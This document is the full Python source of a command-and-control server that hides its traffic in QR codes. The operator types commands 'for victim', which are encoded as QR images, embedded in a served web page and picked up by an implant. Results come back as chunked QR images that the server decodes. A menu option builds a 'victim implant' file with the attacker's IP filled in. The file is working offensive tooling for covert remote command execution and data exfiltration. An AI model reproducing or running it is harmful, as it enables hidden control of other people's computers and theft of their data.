import os
import time
import requests
from http.server import SimpleHTTPRequestHandler, HTTPServer
from io import BytesIO
from PIL import Image
from pyzbar.pyzbar import decode
import threading
import qrcode
import logging
import base64
import re

# GLOBAL VARS
PORT = 8080
POLL_INTERVAL = 3
C2_SERVER_DIR = "server_files"
ATTACKER_IP = None
PROCESSED_DIR = os.path.join(C2_SERVER_DIR, "processed")

if not os.path.exists(PROCESSED_DIR):
    os.makedirs(PROCESSED_DIR)
if not os.path.exists(C2_SERVER_DIR):
    os.makedirs(C2_SERVER_DIR)

TEMPLATE_PATH = "qr_template.py"
logging.basicConfig(level=logging.CRITICAL)



def build_implant(attacker_ip):
    print("[+] Building demo template...")
    with open(TEMPLATE_PATH, "r") as template_file:
        implant_code = template_file.read()

    implant_code = implant_code.replace("{attacker_ip}", attacker_ip).replace("{port}", str(PORT))

    with open("demo.py", "w") as f:
        f.write(implant_code)

    print("[+] Victim implant created as 'demo.py'")

def create_qr_code(command, index):
    print(f"[+] Sending command: {command}")
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(command)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    
    # Convert to base64 for embedding in HTML
    buffer = BytesIO()
    img.save(buffer, format='PNG')
    qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
    
    # Update web.html with the new QR code
    update_web_html(qr_base64)
    
    # Also save as PNG for backward compatibility
    filename = os.path.join(C2_SERVER_DIR, f"command{index}.png")
    img.save(filename)
    print(f"[+] Command QR Code embedded in web.html and saved as '{filename}'")
    return filename

def update_web_html(qr_base64_data):
    """Update web.html with the new QR code embedded as base64"""
    try:
        with open("web.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        
        # First try to replace existing base64 data URL
        pattern = r'src="data:image/png;base64,[^"]*"'
        replacement = f'src="data:image/png;base64,{qr_base64_data}"'
        updated_html = re.sub(pattern, replacement, html_content)
        
        # If pattern not found, try to find the placeholder
        if updated_html == html_content:
            # Replace placeholder in the src attribute
            updated_html = html_content.replace('src="data:image/png;base64,{QR_CODE_DATA}"', 
                                                f'src="data:image/png;base64,{qr_base64_data}"')
            # Also try just the placeholder if the above doesn't match
            if updated_html == html_content:
                updated_html = html_content.replace("{QR_CODE_DATA}", qr_base64_data)
        
        with open("web.html", "w", encoding="utf-8") as f:
            f.write(updated_html)
        
        print(f"[+] Updated web.html with new QR code")
    except Exception as e:
        print(f"[-] Error updating web.html: {e}")

def decode_chunked_results():
    assembled_results = {}
    
    while True:
        for result_file in os.listdir(C2_SERVER_DIR):
            if result_file.startswith("result") and result_file.endswith(".png"):
                chunk_id = result_file.split("_")[-1].split(".")[0]
                result_id = "_".join(result_file.split("_")[:-1])
                
                if result_id not in assembled_results:
                    assembled_results[result_id] = {}

                try:
                    img_path = os.path.join(C2_SERVER_DIR, result_file)
                    img = Image.open(img_path)
                    decoded_objects = decode(img)
                    if decoded_objects:
                        chunk_content = decoded_objects[0].data.decode("utf-8")
                        assembled_results[result_id][chunk_id] = chunk_content
                        if not os.path.exists(PROCESSED_DIR):
                            os.makedirs(PROCESSED_DIR)
                        os.rename(img_path, os.path.join(PROCESSED_DIR, result_file))
                except Exception as e:
                    print(f"[-] Error decoding chunk {result_file}: {e}")

        # Assemble complete results
        for result_id, chunks in list(assembled_results.items()):
            if sorted(chunks.keys()) == [str(i) for i in range(len(chunks))]:
                complete_output = "".join(chunks[str(i)] for i in range(len(chunks)))
                print(f"[+] Complete result from {result_id}:\n{complete_output}")
                del assembled_results[result_id]


class C2ServerHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        return  

    def do_GET(self):
        # Serve web.html with embedded QR code
        if self.path == '/' or self.path == '/web.html':
            if os.path.exists('web.html'):
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                with open('web.html', 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()
        elif self.path.startswith('/command'):
            command_file = os.path.join(C2_SERVER_DIR, self.path.lstrip('/'))
            if os.path.exists(command_file):
                self.send_response(200)
                self.send_header('Content-Type', 'image/png')
                self.end_headers()
                with open(command_file, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_response(404)
                self.end_headers()

    def do_POST(self):
        if self.path.startswith('/result'):
            result_file = os.path.join(C2_SERVER_DIR, self.path.lstrip('/'))
            content_length = int(self.headers['Content-Length'])
            result_data = self.rfile.read(content_length)

            with open(result_file, 'wb') as f:
                f.write(result_data)

            print(f"[+] Received result file: {result_file}")
            self.send_response(200)
            self.end_headers()

def initialize_web_html():
    """Initialize web.html with a default 'waiting' QR code"""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data("WAITING_FOR_COMMAND")
        qr.make(fit=True)
        img = qr.make_image(fill='black', back_color='white')
        
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        qr_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
        
        update_web_html(qr_base64)
        print("[+] Initialized web.html with default QR code")
    except Exception as e:
        print(f"[-] Error initializing web.html: {e}")

def start_server():
    server_address = ('', PORT)
    httpd = HTTPServer(server_address, C2ServerHandler)
    print(f"[+] Starting C2 server on port {PORT}...")
    httpd.serve_forever()

def main():
    command_index = 0
    
    # Initialize web.html with default QR code
    initialize_web_html()
    
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

    result_decoder_thread = threading.Thread(target=decode_chunked_results)
    result_decoder_thread.daemon = True
    result_decoder_thread.start()
    time.sleep(2)
    while True:
        print("[1] Start C2 server")
        print("[2] Build victim implant")
        choice = input("[>] Choose an option: ")

        if choice == "1":
            print("[+] You can start sending commands, once the victim will send the first GET request, the results will be appear here...")
            while True:
                command = input("[>] Enter command for victim: ").strip()
                if command:
                    create_qr_code(command, command_index)
                    command_index += 1
                else:
                    print("[-] Invalid command.")
        elif choice == "2":
            attacker_ip = input("[>] Enter attacker IP: ")
            build_implant(attacker_ip)
        else:
            print("[-] Invalid choice.")

if __name__ == "__main__":
    main()
